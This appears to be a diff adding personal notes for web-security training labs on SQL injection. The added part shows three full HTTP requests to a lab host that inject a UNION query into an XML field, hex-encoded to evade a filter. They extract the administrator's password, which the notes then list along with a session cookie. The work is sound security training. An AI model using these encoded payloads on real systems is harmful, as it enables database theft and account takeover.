@@ -560,3 +560,87 @@ administrator
  
 https://beauknows.tech/posts/collaborator-alternatives/
  
+12) Lab: Blind SQL injection with out-of-band data exfiltration
+ 
+https://beauknows.tech/posts/collaborator-alternatives/
+ 
+13) Lab: SQL injection with filter bypass via XML encoding
+ 
+POST /product/stock HTTP/2
+Host: 0aea008404d0a26980049ef900130060.web-security-academy.net
+Cookie: session=mUr5NCH0y0lfJczFL558H7Zp2Zmtww9u
+Content-Length: 111
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Content-Type: application/xml
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0aea008404d0a26980049ef900130060.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0aea008404d0a26980049ef900130060.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+ 
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>
+1 UNION SELECT NULL</storeId></stockCheck>
+ 
+---
+ 
+Convert selection -> HTML -> HTML-encode all charaters (hex entities)
+ 
+---
+ 
+POST /product/stock HTTP/2
+Host: 0aea008404d0a26980049ef900130060.web-security-academy.net
+Cookie: session=mUr5NCH0y0lfJczFL558H7Zp2Zmtww9u
+Content-Length: 222
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Content-Type: application/xml
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0aea008404d0a26980049ef900130060.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0aea008404d0a26980049ef900130060.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+ 
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>
+&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x4e;&#x55;&#x4c;&#x4c;</storeId></stockCheck>
+ 
+---
+ 
+POST /product/stock HTTP/2
+Host: 0aea008404d0a26980049ef900130060.web-security-academy.net
+Cookie: session=mUr5NCH0y0lfJczFL558H7Zp2Zmtww9u
+Content-Length: 498
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Content-Type: application/xml
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://0aea008404d0a26980049ef900130060.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0aea008404d0a26980049ef900130060.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+ 
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>
+&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x20;&#x57;&#x48;&#x45;&#x52;&#x45;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x3d;&#x27;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;</storeId></stockCheck>
+ 
+---
+ 
+administrator
+fx861hyizpx9xdwfjsq4
